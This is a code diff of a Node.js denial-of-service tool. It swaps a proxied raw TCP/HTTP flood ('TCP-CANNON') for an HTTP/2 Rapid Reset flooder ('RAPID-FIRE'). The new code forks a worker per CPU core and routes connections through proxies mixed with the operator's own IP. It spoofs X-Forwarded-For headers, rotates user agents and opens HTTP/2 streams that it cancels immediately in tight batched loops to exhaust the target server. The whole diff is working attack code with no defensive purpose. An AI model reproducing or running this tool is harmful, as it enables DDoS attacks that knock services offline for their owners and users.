@@ -1,9 +1,12 @@
-// R10-2: TCP-CANNON - Raw Socket Flood
-// Focus: Bypass HTTP limitations, hit TCP layer
-// Technique: Partial packets + Connection saturation
+// R10-1: RAPID-FIRE - HTTP/2 Rapid Reset Specialist
+// Focus: Maximum request rate with minimal CPU
+// Technique: Stream cancellation + Connection reuse
+// Updated: Mixed main IP + proxies
 
-const net = require('net');
+const http2 = require('http2');
 const tls = require('tls');
+const net = require('net');
+const url = require('url');
 const fs = require('fs');
 const cluster = require('cluster');
 const os = require('os');
@@ -17,106 +20,170 @@ try {
     proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
         .map(line => line.trim())
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(`[R10-2] Loaded ${proxies.length} proxies`);
+    console.log(`[R10-1] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-2] No proxy.txt found, running without proxies');
+    console.log('[R10-1] No proxy.txt found, running with main IP only');
 }
+
+// Add MAIN IP to proxy list (special flag)
+const USE_MAIN_IP = true; // Set to true to use main IP
+const MIX_RATIO = 0.3; // 30% main IP, 70% proxies
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
         .map(line => line.trim())
         .filter(line => line && !line.startsWith('#'));
-} catch (e) {}
+    console.log(`[R10-1] Loaded ${userAgents.length} user agents`);
+} catch (e) {
+    console.log('[R10-1] No ua.txt found, using default UAs');
+    userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+    ];
+}
 
 if (cluster.isMaster) {
-    console.log(`[R10-2] TCP-CANNON launching on ${CPU_CORES} cores`);
+    console.log(`[R10-1] Master ${process.pid} launching ${CPU_CORES} workers`);
+    console.log(`[R10-1] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
-    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
+    setTimeout(() => {
+        process.exit(0);
+    }, process.argv[3] * 1000 || 300);
 } else {
     const target = process.argv[2];
     const time = process.argv[3] || 300;
-    startTCPCannon(target, time);
+    const rate = process.argv[4] || 1000;
+    
+    startRapidFire(target, time, rate);
 }
 
-function startTCPCannon(target, time) {
-    const parsed = new URL(target);
-    const host = parsed.hostname;
-    const port = parsed.protocol === 'https:' ? 443 : 80;
-    
-    let connections = [];
-    let requestCount = 0;
-    
-    const interval = setInterval(() => {
-        // Rotate connections
-        if (connections.length > 10000) {
-            connections.splice(0, 5000).forEach(s => s.destroy());
-        }
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
+}
+
+function createProxiedConnection(proxy, targetHost) {
+    return new Promise((resolve, reject) => {
+        const [proxyHost, proxyPort] = proxy.split(':');
         
-        for (let i = 0; i < 500; i++) {
+        const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
+            socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\n\r\n`);
+            
+            socket.once('data', () => {
+                const tlsSocket = tls.connect({
+                    socket: socket,
+                    servername: targetHost,
+                    rejectUnauthorized: false,
+                    ALPNProtocols: ['h2']
+                }, () => {
+                    resolve(tlsSocket);
+                });
+                
+                tlsSocket.on('error', reject);
+            });
+        });
+        
+        socket.on('error', reject);
+    });
+}
+
+function createDirectConnection(targetHost) {
+    return new Promise((resolve, reject) => {
+        const tlsConn = tls.connect({
+            host: targetHost,
+            port: 443,
+            servername: targetHost,
+            rejectUnauthorized: false,
+            ALPNProtocols: ['h2']
+        }, () => resolve(tlsConn));
+        
+        tlsConn.on('error', reject);
+    });
+}
+
+function startRapidFire(target, time, rate) {
+    const parsed = new URL(target);
+    const sessions = [];
+    let requestCount = 0;
+    let mainIpCount = 0;
+    let proxyCount = 0;
+    
+    // Create connection pool
+    (async () => {
+        for (let i = 0; i < 200; i++) {
             try {
-                if (proxies.length > 0) {
-                    // Use proxy
-                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-                    const [proxyHost, proxyPort] = proxy.split(':');
-                    
-                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
-                        socket.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\n\r\n`);
-                        
-                        setTimeout(() => {
-                            const ua = userAgents.length > 0 
-                                ? userAgents[Math.floor(Math.random() * userAgents.length)]
-                                : 'Mozilla/5.0';
-                            
-                            socket.write(`GET ${parsed.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`);
-                            requestCount++;
-                        }, 10);
-                    });
-                    
-                    socket.setTimeout(5000);
-                    socket.on('error', () => {});
-                    socket.on('timeout', () => socket.destroy());
-                    
-                    connections.push(socket);
+                let tlsConn;
+                const useMain = shouldUseMainIp();
+                
+                if (!useMain && proxies.length > 0) {
+                    const proxy = proxies[i % proxies.length];
+                    tlsConn = await createProxiedConnection(proxy, parsed.hostname);
+                    proxyCount++;
                 } else {
-                    // Direct connection
-                    const socket = net.connect(port, host, () => {
-                        const ua = userAgents.length > 0 
-                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
-                            : 'Mozilla/5.0';
-                        
-                        socket.write(`GET ${parsed.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`);
-                        requestCount++;
-                    });
-                    
-                    socket.setTimeout(5000);
-                    socket.on('error', () => {});
-                    socket.on('timeout', () => socket.destroy());
-                    
-                    connections.push(socket);
+                    tlsConn = await createDirectConnection(parsed.hostname);
+                    mainIpCount++;
                 }
                 
-                // Cleanup old sockets
-                setTimeout(() => {
-                    const idx = connections.indexOf(socket);
-                    if (idx > -1) {
-                        connections.splice(idx, 1);
-                        socket.destroy();
-                    }
-                }, 10000);
-            } catch (e) {}
+                const session = http2.connect(parsed.origin, {
+                    createConnection: () => tlsConn
+                });
+                
+                session.on('error', () => {});
+                sessions.push(session);
+            } catch (e) {
+                // Skip failed connections
+            }
+            
+            if (i >= 200) break;
         }
-    }, 50);
+        
+        console.log(`[R10-1] Connections: Main IP: ${mainIpCount}, Proxy: ${proxyCount}`);
+    })();
+    
+    // Rapid Reset Attack Loop
+    const interval = setInterval(() => {
+        for (let s = 0; s < sessions.length; s++) {
+            const session = sessions[s];
+            if (!session || session.destroyed) continue;
+            
+            // Batch requests for maximum speed
+            for (let i = 0; i < 100; i++) {
+                try {
+                    const ua = userAgents.length > 0 
+                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
+                        : 'Mozilla/5.0';
+                    
+                    const headers = {
+                        ':method': 'GET',
+                        ':path': parsed.pathname + '?' + Math.random().toString(36).substring(7),
+                        'user-agent': ua,
+                        'accept': '*/*',
+                        'cache-control': 'no-cache',
+                        'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+                    };
+                    
+                    const req = session.request(headers);
+                    req.on('error', () => {});
+                    
+                    // IMMEDIATE CANCEL - This is the key!
+                    req.close(http2.constants.NGHTTP2_CANCEL);
+                    requestCount++;
+                } catch (e) {}
+            }
+        }
+    }, 10);
     
     // Show stats
-    setInterval(() => {
-        console.log(`[R10-2] RPS: ${requestCount} | Connections: ${connections.length}`);
+    const statsInterval = setInterval(() => {
+        console.log(`[R10-1] RPS: ${requestCount} | Sessions: ${sessions.length} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
         requestCount = 0;
     }, 1000);
     
     setTimeout(() => {
         clearInterval(interval);
-        connections.forEach(s => {
+        clearInterval(statsInterval);
+        sessions.forEach(s => {
             try { s.destroy(); } catch (e) {}
         });
         process.exit(0);
